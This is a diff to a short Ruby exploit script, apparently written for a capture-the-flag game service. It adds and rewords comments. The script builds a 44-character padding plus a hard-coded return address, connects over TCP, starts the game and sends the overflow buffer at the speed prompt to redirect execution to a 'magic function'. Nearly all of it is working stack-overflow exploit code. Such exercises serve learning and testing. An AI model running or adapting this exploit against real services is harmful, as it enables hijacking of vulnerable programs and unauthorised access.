@@ -7,6 +7,7 @@ port = PORT
 # where you want to jump after doing leaking
 return_addr = "\xcd\x88\x04\x08"
 
+# follwing is the buffer to do leaking
 # fill total 44 char
 buf = ''
 44.times { buf << 'a' }
@@ -16,14 +17,15 @@ buf << "\r\n"
 puts buf
 
 s = TCPSocket.open(hostname, port)
+
+# Read lines by lines from the socket
 while line = s.gets
-  # Read lines from the socket
   print line
 
-  # send choice to start game
-  # played not equal 0 means we have played once
+  # send choice '1' to start game
   (line.chop.eql? '3.Exit') && s.send("1\r\n", 0)
-  # send speed setting
+  # send speed setting and leak here!
+  # jump to the magic function!
   (line.chop.eql? 'Choose the speed level(1-9):') && s.send(buf, 0)
 
 end
